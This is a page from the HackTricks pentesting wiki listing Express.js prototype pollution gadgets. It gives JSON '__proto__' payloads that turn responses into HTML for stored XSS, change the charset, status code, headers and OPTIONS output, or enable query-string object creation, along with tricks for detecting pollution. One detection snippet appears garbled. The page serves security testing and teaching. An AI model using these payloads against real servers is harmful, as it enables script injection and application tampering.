---
title: "Express Prototype Pollution Gadgets"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

## Serve XSS responses

For further details, see the original research.[\[1\]](#references)

### Change JSON content-type to HTML

Consider an Express app that accepts JSON and reflects a JSON object:

```
app.use(bodyParser.json({ type: "application/json" }))
app.post("/", function (req, res) {
  _.merge({}, req.body)
  res.send(req.body)
})
```
XSS is not normally possible when the response remains JSON. In affected Express versions/configurations, however, prototype pollution can make Express **serve an HTML response**. This gadget relies on the application using **`res.send(obj)`** and a body parser configured for the `application/json` content type.[\[1\]](#references)

```
{ "__proto__": { "_body": true, "body": "<script>evil()" } }
```
By **polluting** **`body`** and **`_body`** properties, it’s possible to cause **Express to serve up the HTML content type** and reflect the `_body` property, resulting in stored XSS.

### Render UTF-7 (historical)

The original research identified an Express gadget that could influence the response content type and request UTF-7. Treat it as version-dependent; modern browsers do not generally support UTF-7 HTML interpretation.[\[1\]](#references)[\[2\]](#references)

```
{ "__proto__": { "content-type": "application/json; charset=utf-7" } }
```
## Safer scanning techniques

### JSON spaces

The following prototype-pollution payload makes serialized JSON use an extra space without normally breaking functionality:[\[1\]](#references)

```
{ "__proto__": { "json spaces": " " } }
```
The reflected JSON then looks like:

```
{"foo":  "bar"} -- Note the extra space
```
### Exposed Headers

The following gadget can make an affected server return the HTTP header **`Access-Control-Expose-Headers: foo`**:[\[1\]](#references)

```
{ "__proto__": { "exposedHeaders": ["foo"] } }
```
It requires the **CORS module to be installed**.

### **OPTIONS Method**

**OPTIONS Method**

With the following payload, it’s possible to **hide a method from an OPTIONS response**:

```
// Original response: POST,GET,HEAD
// Payload:
{"__proto__":{"head":true}}
//New response: POST;GET
```
### **Status**

**Status**

It’s possible to change the **returned status code** using the following PP payload:

```
{ "__proto__": { "status": 510 } }
```
### Error

When you assign to a prototype with a primitive such as a string, it produces a **no-op operation since the prototype has to be an object**. If you attempt to assign a prototype object to the `Object.prototype` itself, this will **throw an exception**. We can use these two behaviours to **detect if prototype pollution was successful**:

```
;({}).__proto__.__proto__ = {}(
  //throws type exception
  {}
).__proto__.__proto__ = "x" //no-op does not throw exception
```
### Reflected Value

When an application includes an object in its response, creating an attribute with an **unusual name alongside `__proto__`** can be insightful. Specifically, if **only the unusual attribute is returned** in the response, this could indicate the application’s vulnerability:

```
{ "unusualName": "value", "__proto__": "test" }
```
Moreover, in scenarios where a library like Lodash is employed, setting a property both via prototype pollution (PP) and directly inside the object offers another diagnostic approach. If such a property is omitted from the response, it suggests that Lodash is verifying the existence of the property in the target object before merging:

```
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### Allow Dots

There is an option in Express that allows you to **create objects from query string parameters**.

You could definitely use it in a bug **chain** to exploit a **prototype pollution vulnerability**.[\[1\]](#references)

```
{ "__proto__": { "allowDots": true } }
```
`?foo.bar=baz` create an object in Node.

## References
